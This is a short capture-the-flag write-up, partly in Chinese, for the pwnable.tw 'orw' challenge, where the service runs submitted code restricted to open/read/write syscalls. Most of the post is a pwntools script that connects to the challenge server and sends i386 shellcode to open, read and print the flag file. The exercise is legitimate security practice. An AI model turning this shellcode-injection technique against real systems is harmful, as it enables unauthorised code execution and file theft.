---
title: "Pwnable.tw orw Writeup"
description: "Pwnable.tw orw Writeup"
publishDate: "10 Nov 2024"
updatedDate: "25 Aug 2025"
tags: ["CTF", "writeup", "pwnable.tw"]
---

# 題目

## 簡介

Read the flag from /home/orw/flag.  
Only open read write syscall are allowed to use.

[pwnable.tw_orw](https://pwnable.tw/challenge/#2)

# 題解

總之就是你丟什麼他就執行什麼  
但是只能用 **read/write/open**

# Exploit

```python
from pwn import *
context.arch = "i386"
r = remote("chall.pwnable.tw", 10001)

# 使用 shellcraft 生成 shellcode
# 讀取並輸出 50 個 byte
sc = asm(
    shellcraft.i386.linux.open(b'/home/orw/flag') +
    shellcraft.i386.linux.read('eax', 'esp', 50) +
    shellcraft.i386.linux.write('1', 'esp', 50)
)

r.sendlineafter(b':', sc)
print(r.recvuntil(b'}'))

r.interactive()
```
